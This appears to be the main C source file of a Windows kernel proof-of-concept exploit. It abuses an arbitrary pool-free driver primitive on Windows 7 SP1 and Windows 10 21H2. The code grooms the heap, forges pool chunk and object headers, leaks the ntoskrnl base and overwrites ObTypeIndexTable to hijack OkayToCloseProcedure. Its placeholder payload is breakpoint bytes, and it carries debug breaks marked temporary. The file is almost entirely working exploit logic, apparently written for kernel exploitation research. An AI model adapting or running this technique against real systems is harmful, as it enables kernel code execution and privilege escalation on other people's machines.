#include "exploit.h"

char unused = 0, output[1024], * fake_pool_memory_page = 0, * dummy_object_type = 0, * okaytocloseprocedure = 0;
HANDLE h_driver = (HANDLE)-1;
void* heaps[HEAP_OBJECT_COUNT];
unsigned long bytes_returned = 0, old_protection = 0;
long long ntoskrnl_base_address = 0;
int success_counter = 0;

POOL_HEADER_W10_21H2 pool_header;
OBJECT_HEADER_QUOTA_INFO_W10_21H2 object_header_quota_info;
EX_PUSH_LOCK_W10_21H2 ex_push_lock;
QUAD_W10_21H2 quad;
OBJECT_CREATE_INFORMATION_W10_21H2 object_create_information;
OBJECT_HEADER_W10_21H2 object_header;

POOL_HEADER_W7_SP1 pool_header2;
OBJECT_HEADER_QUOTA_INFO_W7_SP1 object_header_quota_info2;
OBJECT_HEADER_W7_SP1 object_header2;

int main(int argc, char** argv)
{
	system("title nt!ExFreePoolWithTag");

	RtlSecureZeroMemory(heaps, sizeof(heaps));
	RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
	RtlSecureZeroMemory(&object_header_quota_info, sizeof(object_header_quota_info));
	RtlSecureZeroMemory(&ex_push_lock, sizeof(ex_push_lock));
	RtlSecureZeroMemory(&quad, sizeof(quad));
	RtlSecureZeroMemory(&object_create_information, sizeof(object_create_information));
	RtlSecureZeroMemory(&object_header, sizeof(object_header));
	RtlSecureZeroMemory(&pool_header2, sizeof(pool_header2));
	RtlSecureZeroMemory(&object_header_quota_info2, sizeof(object_header_quota_info2));
	RtlSecureZeroMemory(&object_header2, sizeof(object_header2));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s[!] nt!ExFreePoolWithTag Proof-of-Concept Exploit\n[!] This exploit was tested on Windows 7 SP1 x64 and Windows 10 21H2 x64.\n[!] Lets Exploit!", BANNER);

	h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		heaps[i] = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
		if (!heaps[i])
		{
			printf("\n[-] Failed to allocate heap object %d.", i);
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Allocated %d heap objects.\n[+] Successfully put the process heap into a predictable state.", success_counter);

	fake_pool_memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	if (!fake_pool_memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the heap. Allocation Address: 0x%p", fake_pool_memory_page);

	if (!VirtualLock(fake_pool_memory_page, 4096))
	{
		printf("\n[-] Failed to lock the heap allocation into physical memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Locked the heap allocation into physical memory.");

	// temporary
	printf("\nhit enter when ready");
	getchar();
	DebugBreak();

	if (!VirtualProtect(fake_pool_memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the allocation as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the allocation as read+write+executable.");

	success_counter = 0;
	for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		if (!HeapFree(GetProcessHeap(), 0, heaps[i]))
		{
			printf("\n[-] Failed to free heap object %d. Error: %d (0x%x)", i, GetLastError(), GetLastError());
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Freed the %d heap objects.", success_counter);

	ntoskrnl_base_address = leak_ntoskrnl_base();
	if (!ntoskrnl_base_address)
	{
		return 1;
	}

	if (!IsWindowsServer())
	{
		if (IsWindows10OrGreater())
		{
			printf("\n[*] Determined Windows Version: Windows 10 and above.\n[!] NOTE: Windows 7 is currently the only functional exploit.");
			return windows10_21H2();
		}
		else if (IsWindows7OrGreater())
		{
			printf("\n[*] Determined Windows Version: Windows 7 and above.");
			return windows7_SP1();
		}
	}
	printf("\n[-] Windows Server builds are currently not supported.");
	unused = getchar();
	return 1;
}

int windows7_SP1()
{
	initialize_main_pool_structs_w7_SP1(&pool_header2, &object_header_quota_info2, &object_header2);
	if (pool_header2.PoolTag != DXGK_POOL_TAG)
	{
		printf("\n[!] Initialized pool header structure does not appear to have a matching pool tag.\n[!] Pool tag %d (0x%x) does not match pool tag %d (0x%x).", pool_header2.PoolTag, pool_header2.PoolTag, DXGK_POOL_TAG, DXGK_POOL_TAG);
	}

	build_pool_chunk_w7_SP1(fake_pool_memory_page, pool_header2, object_header_quota_info2, object_header2);
	if (*(PULONG)(fake_pool_memory_page + 0x4) != DXGK_POOL_TAG)
	{
		printf("\n[!] Fake pool chunk does not appear to have a matching pool tag.\n[!] Pool tag %d (0x%x) does not match pool tag %d (0x%x).", *(PULONG)(fake_pool_memory_page + 0x4), *(PULONG)(fake_pool_memory_page + 0x4), DXGK_POOL_TAG, DXGK_POOL_TAG);
	}
	else
	{
		printf("\n[+] Successfully rebuilt a \"DxgK\" pool chunk. Pool Tag: %d (0x%x)", DXGK_POOL_TAG, DXGK_POOL_TAG);
	}

	if (mark_pool_structs_executable_w7_SP1(&pool_header2, &object_header_quota_info2, &object_header2))
	{
		return 1;
	}

	dummy_object_type = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!dummy_object_type)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the stack. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the stack. Allocation Address: 0x%p", dummy_object_type);

	RtlSecureZeroMemory(dummy_object_type, 4096);
	printf("\n[+] Zero'd the stack allocation.");

	okaytocloseprocedure = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!okaytocloseprocedure)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the stack. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the stack. \"OkayToCloseProcedure\" Allocation Address: 0x%p", okaytocloseprocedure);

	memset(okaytocloseprocedure, 0xCC, 4096);
	printf("\n[+] Mapped the \"OkayToCloseProcedure\" stack allocation with 4096 breakpoint instructions.");

	*(long long*)(dummy_object_type + 0x40 + 0x68) = (long long*)okaytocloseprocedure;
	printf("\n[+] Placed the \"OkayToCloseProcedure\" pointer onto the fake object allocation. Pointer Address: 0x%p", (long long*)(dummy_object_type + 0x40 + 0x68));

	printf("\n[+] Calculated object type index pointer table address. Type Index Table Address: 0x%p", (long long*)(ntoskrnl_base_address + NT_OBTYPEINDEXTABLE_7_SP1_X64_OFFSET));
	arbitrary_write(h_driver, (long long*)dummy_object_type, ntoskrnl_base_address + NT_OBTYPEINDEXTABLE_7_SP1_X64_OFFSET);

	printf("\n[+] Calculated non-paged pool descriptor address. Non-Paged Pool Descriptor Address: 0x%p\n[+] Calculated \"PendingFrees\" list address. PendingFrees Address: 0x%p\n[+] Pool Allocation Address Dereferenced Value: %d (0x%x)\n[!] Freeing the target pool chunk...", (long long*)(ntoskrnl_base_address + NONPAGED_POOL_DESCRIPTOR_7_SP1_X64_OFFSET), (long long*)(ntoskrnl_base_address + NONPAGED_POOL_DESCRIPTOR_PENDINGFREES_7_SP1_X64_OFFSET), *fake_pool_memory_page, *fake_pool_memory_page);
	Sleep(3000);

	// temporary
	DebugBreak();

	arbitrary_write(h_driver, fake_pool_memory_page, (long long*)(ntoskrnl_base_address + NONPAGED_POOL_DESCRIPTOR_PENDINGFREES_7_SP1_X64_OFFSET));

	// temporary
	DebugBreak();

	// When in doubt, try this IO control code call.
	// DeviceIoControl(h_driver, IOCTL_ARBITRARY_POOL_FREE, &fake_pool_memory_page, sizeof(fake_pool_memory_page), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Freed the target pool chunk.");

	arbitrary_write(h_driver, 0, ntoskrnl_base_address + NT_OBTYPEINDEXTABLE_7_SP1_X64_OFFSET);
	printf("\n[+] Exploit completed.");

	unused = getchar();
	return 0;
}

int windows10_21H2()
{
	initialize_main_pool_structs_w10_21H2(fake_pool_memory_page, &pool_header, &object_header_quota_info, &ex_push_lock, &quad, &object_header, &object_create_information);
	if (pool_header.PoolTag != VM3D_POOL_TAG)
	{
		printf("\n[!] Initialized pool header structure does not appear to have a matching pool tag.\n[!] Pool tag %d (0x%x) does not match pool tag %d (0x%x).", pool_header.PoolTag, pool_header.PoolTag, VM3D_POOL_TAG, VM3D_POOL_TAG);
	}

	build_pool_chunk_w10_21H2(fake_pool_memory_page, pool_header, object_header_quota_info, object_header);
	if (*(PULONG)(fake_pool_memory_page + 8) != VM3D_POOL_TAG)
	{
		printf("\n[!] Fake pool chunk does not appear to have a matching pool tag.\n[!] Pool tag %d (0x%x) does not match pool tag %d (0x%x).", *(unsigned long*)(fake_pool_memory_page + 8), *(unsigned long*)(fake_pool_memory_page + 8), VM3D_POOL_TAG, VM3D_POOL_TAG);
	}
	else
	{
		printf("\n[+] Successfully rebuilt a \"VM3D\" pool chunk. Pool Tag: %d (0x%x)", VM3D_POOL_TAG, VM3D_POOL_TAG);
	}

	if (mark_pool_structs_executable_w10_21H2(&pool_header, &object_header_quota_info, &ex_push_lock, &quad, &object_header, &object_create_information))
	{
		return 1;
	}

	dummy_object_type = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!dummy_object_type)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the stack. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the stack. Allocation Address: 0x%p", dummy_object_type);

	RtlSecureZeroMemory(dummy_object_type, 4096);
	printf("\n[+] Zero'd the stack allocation.");

	okaytocloseprocedure = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!okaytocloseprocedure)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the stack. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the stack. \"OkayToCloseProcedure\" Allocation Address: 0x%p", okaytocloseprocedure);

	memset(okaytocloseprocedure, 0xCC, 4096);
	printf("\n[+] Mapped the \"OkayToCloseProcedure\" stack allocation with 4096 breakpoint instructions.");

	*(long long*)(dummy_object_type + 0xA8) = (long long*)okaytocloseprocedure;
	printf("\n[+] Placed the \"OkayToCloseProcedure\" pointer onto the fake object allocation. Pointer Address: 0x%p", (long long*)(dummy_object_type + 0xA8));

	printf("\n[+] Calculated object type index pointer table address. Type Index Table Address: 0x%p", (long long*)(ntoskrnl_base_address + NT_OBTYPEINDEXTABLE_21H2_X64_OFFSET));
	arbitrary_write(h_driver, (long long*)dummy_object_type, ntoskrnl_base_address + NT_OBTYPEINDEXTABLE_21H2_X64_OFFSET);

	Sleep(5000);
	DebugBreak();

	printf("\n[!] Freeing the target pool chunk...");
	Sleep(1000);

	DeviceIoControl(h_driver, IOCTL_ARBITRARY_POOL_FREE, &fake_pool_memory_page, sizeof(fake_pool_memory_page), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Freed the target pool chunk.");

	arbitrary_write(h_driver, 0, ntoskrnl_base_address + NT_OBTYPEINDEXTABLE_21H2_X64_OFFSET);
	printf("\n[+] Exploit completed.");

	unused = getchar();
	return 0;
}